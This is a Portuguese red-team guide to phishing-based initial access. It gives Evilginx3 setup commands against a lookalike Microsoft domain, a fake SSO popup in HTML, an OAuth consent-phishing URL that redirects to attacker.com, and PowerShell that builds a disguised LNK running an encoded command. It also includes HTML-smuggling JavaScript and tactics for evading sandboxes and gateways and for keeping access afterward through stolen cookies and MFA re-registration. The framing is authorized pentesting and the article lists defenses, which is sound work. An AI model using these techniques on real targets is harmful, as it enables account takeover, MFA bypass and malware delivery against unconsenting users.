---
title: Initial Access Moderno — Evilginx3, Browser-in-Browser, OAuth Phishing
category: auth
stack: [EvilGinx, phishing, OAuth, MFA bypass]
tags: [initial-access, phishing, evilginx, mfa-bypass, social-engineering]
excerpt: Phishing em era MFA — Evilginx3 reverse proxy, browser-in-the-browser, OAuth consent phishing, payload smuggling em containers, social engineering 2026.
related: [sec-auth-attacks-modern, sec-c2-frameworks-modern, sec-red-team-ops-2026]
updated: "2026-05-10"
---

## A guerra de phishing em 2026

Em 2020: phishing = página fake de login, captura user+pass. MFA derrota.
Em 2026: phishing precisa derrotar MFA. **Adversary-in-the-Middle (AitM)** dominou.

Ferramentas evoluíram: Evilginx3, Modlishka, Muraena, EvilProxy (commercial). Defesa também: FIDO2 / WebAuthn (phishing-resistant), conditional access policies, anti-AitM detection.

## Evilginx3 — Reverse Proxy AitM

Evilginx senta entre vítima e o site real. Captura credenciais **e** cookies de sessão (incluindo pós-MFA).

```
Victim browser → Evilginx → Real site (M365, Google, Okta)
                  ↓ captures:
                  - Login credentials
                  - MFA challenge response
                  - Session cookies (including "remember me")
```

### Como funciona

1. Atacante registra `microsoft-corp-login.com` (typo/lookalike).
2. Configura Evilginx com **phishlet** (config YAML pro target site).
3. Vítima clica em link de email → vai pra evilginx domain.
4. Evilginx renderiza login real do M365 (proxy), incluindo MFA prompt.
5. Vítima loga, completa MFA. Site real autentica.
6. Site real seta cookie de sessão → Evilginx captura.
7. Atacante usa cookie no próprio browser → sessão de vítima (sem precisar MFA).

### Setup

```bash
# Install
wget https://github.com/kgretzky/evilginx2/releases/latest/download/evilginx-linux-amd64.zip
unzip evilginx-linux-amd64.zip

# DNS: A record evilginx.com → server IP
# Cert: Let's Encrypt via Evilginx autocert

./evilginx -p phishlets/
> config domain microsoft-corp-login.com
> config ip <server-ip>
> phishlets hostname m365 login.microsoft-corp-login.com
> phishlets enable m365
> lures create m365
> lures get-url 0
# Retorna URL pra mandar pra vítima
```

### Phishlets

Phishlets são YAMLs que mapeiam target site → cookies/sessions/MFA. Evilginx3 vem com ~10 oficiais (M365, Google, Okta, Facebook). Comunidade publica privados (alguns charge).

### Bypass — quem é safe contra Evilginx

- **FIDO2 / WebAuthn / Passkeys** — cryptography binda autenticação à origin. Evilginx em domain ≠ original = falha automaticamente.
- **Conditional Access com device-bound tokens** (Entra ID compliant device only).
- **Anti-AitM detection** — beacon de browser javascript detecta proxy/iframe abnormal.

90% das empresas em 2026 ainda usam OTP/push — vulneráveis.

## Browser-in-the-Browser (BitB)

Técnica de mr.d0x (2022). Janela fake "popup" de OAuth dentro do site malicioso — parece SSO legítimo.

```html
<!-- Site malicioso renderiza HTML que parece popup do M365 SSO -->
<div class="fake-window">
  <div class="title-bar">Sign in with Microsoft</div>
  <div class="url-bar">https://login.microsoftonline.com</div>
  <!-- Form que captura credenciais -->
</div>
```

User vê barra URL "fake" mostrando microsoftonline.com. Clica login, manda pra atacante.

Defense: educação user (usuário deveria poder mover window — fake é div, não move). Em prática, não funciona — users clicam.

## OAuth Consent Phishing

Atacante registra app no Entra ID / Google Cloud. User clica em link de "consent screen" legítimo:

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<attacker-app-id>&
  response_type=code&
  redirect_uri=https://attacker.com/callback&
  scope=https://graph.microsoft.com/.default offline_access&
  state=...
```

User vê "Microsoft Login" real, clica "Allow". Atacante recebe access token + refresh token pra Graph API:
- Ler emails (`Mail.Read`).
- Send mail como user (`Mail.Send`).
- Read OneDrive (`Files.Read.All`).
- Read contacts (`Contacts.Read`).

Sem credenciais roubadas, sem MFA bypass. Permission grant é a "credencial".

### Defenses

- Block third-party app consent por default (admin-managed).
- Limite scope (apps pré-aprovados).
- Detection de OAuth apps com permissões altas adicionadas recentemente.

## Payload delivery moderno

### ISO / IMG smuggling

ZIP, RAR não são clickable hoje (warnings, mark-of-the-web propagated). ISO/IMG não — Windows monta direto sem MOTW.

```bash
# Cria ISO com payload
mkisofs -V "Office365_Update" -o payload.iso ./payload-dir
```

ISO mounted → user vê pasta com `Office365_Update.lnk` que aponta pra LOLBin + PowerShell encoded.

Microsoft em 2024-2025 mudou pra propagar MOTW também em ISO — ainda funciona com bypass via `mark-of-the-web removal techniques`.

### LNK files

Atalho Windows que executa qualquer comando. Suporta path = `cmd.exe /c <payload>` mas pode esconder em "Target" parameter.

```powershell
# Cria LNK programaticamente
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("$pwd\Update.lnk")
$shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$shortcut.Arguments = "/c powershell -enc <base64>"
$shortcut.IconLocation = "C:\Windows\System32\imageres.dll,1"   # ícone de PDF
$shortcut.Save()
```

Wrapped em ISO/ZIP, parece doc legítimo.

### HTML smuggling

Email com HTML que reconstrói payload binário em JavaScript (blob), salva localmente:

```html
<script>
const data = base64decode("UEsDBBQAAAAIAA...");   // ZIP bytes em base64
const blob = new Blob([data], {type: "application/octet-stream"});
const url = URL.createObjectURL(blob);
const a = document.createElement('a');
a.href = url; a.download = "Invoice.zip";
a.click();
</script>
```

Bypass de email gateway (que escaneia attachment) — payload é "criado" no browser do user.

### Container delivery

Word/Excel/PDF/OneNote em scope. Em 2026:

- **Office macros**: Microsoft bloqueia VBA de internet-downloaded files por default desde 2022. Ainda funciona se user "Enable Content".
- **VBS / WSF / JS files**: Windows Defender bloqueia por padrão.
- **OneNote attachments**: foi vetor 2022-2023. MS bloqueou em 2023.
- **MSIX installer**: requer signing, funciona em endpoints managed.
- **MSI files**: ainda funciona, custom MSI com side-load DLL.

Atual sweet spot: ISO + LNK + Office without macros (DLL sideload via legit binary in ISO).

## Phishing campaign — playbook

### Pre-engagement

- Pretext aprovado pelo cliente (RoE define).
- Email infra: rented server, properly setup SPF/DKIM/DMARC do atacante domain.
- Domain reputation: warm-up por 1-2 semanas antes (mandar low-volume legitimate-looking traffic).
- VirusTotal / URLscan submissions = vazam — avoid hitting these.

### Email gateway evasion

Gmail/M365 escaneiam URLs:
- **URL detonation**: sandbox detona URL pré-delivery. Use tempo: serve página benigna por 1h após registro, ative payload depois.
- **CAPTCHAs**: por URL — sandbox não passa CAPTCHA, real user passa. Bypassa detonation.
- **Domain shadowing**: subdomain de domínio legitimate hackeado pra hospedar phish.
- **Click frequency**: link único por destinatário (defender clicked + bloqueia não afeta others).

### Pos-collection

- **Cookie use**: rapidamente, antes do user notar atividade estranha.
- **Persistence**: register MFA new device no perfil da vítima (precisa de re-MFA — use cookie quickly).
- **Token refresh**: refresh tokens válidos 90 dias default em Entra ID. Pode trocar por novos access tokens depois.
- **Lateral**: pivot pra outros services via Graph API, Outlook calendar mining, OneDrive search por palavras-chave.

## Métricas de engagement de phishing

Cliente quer KPIs:

- **Click rate**: % users que clicaram (típico: 10-30% em empresa não-treinada, 2-8% em maduras).
- **Credential entry rate**: % que clicaram + entered cred.
- **MFA completion rate**: % que completaram MFA (caem em AitM).
- **Reported rate**: % que clicked Reply/forward pra security@.
- **Time-to-report**: minuto até primeira notificação ao SOC.

Bom report inclui: trend over time (% reduzindo via training), grupos mais vulneráveis, mensagens mais efetivas.

## Vishing / Smishing

Vishing (voz) e smishing (SMS) escalaram em 2024-2025:

- **Vishing**: AI voice cloning (ElevenLabs, OpenVoice). Spear vishing pra C-suite em alta.
- **Smishing**: SIM swap → 2FA bypass; Q4 financial scams.

Em engagement adversary simulation, vishing scope é raro mas presente. Requer team treinada em social engineering (não comprato).

## Defesas modernas (que pentester precisa entender)

- **FIDO2/WebAuthn** — phishing-resistant by design.
- **Conditional Access** + **Risk-based authentication** (Azure Identity Protection, Okta ThreatInsight).
- **Browser isolation** — Symantec, Menlo, Cloudflare Browser Isolation. URLs abrem em remote browser, render só pixels.
- **DMARC enforcement** (`p=reject`) → reduz brand impersonation.
- **Microsoft Defender for Office 365 Plan 2** — Safe Links, Safe Attachments, AIR (auto-IR).
- **Anti-AitM** detection — Microsoft, Cloudflare publicaram detection mechanisms 2024+.

## Checklist de phishing engagement

- [ ] Pretext approved by client?
- [ ] Domain reputation warmed?
- [ ] DMARC/SPF/DKIM configured?
- [ ] AitM tool (Evilginx) setup with phishlet tested?
- [ ] CAPTCHA / pre-detonation evasion in place?
- [ ] Cookie capture working e2e tested?
- [ ] Metrics collection set up (click tracking, cred entry tracking)?
- [ ] Stop condition definido (X clicks alcançados)?

## Leituras

- "The Art of Deception" — Kevin Mitnick (clássico, ainda relevante)
- "Adversary in the Middle Attacks" — Cloudflare research
- Evilginx2 docs — kgretzky/evilginx2 wiki
- "Phishing Dark Waters" — Hadnagy
- KnowBe4 reports (benchmark de click rates)
- Microsoft Digital Defense Report (anual, threat data)
- "Operating with No Hands" — Hammond + Lokas (modern initial access)
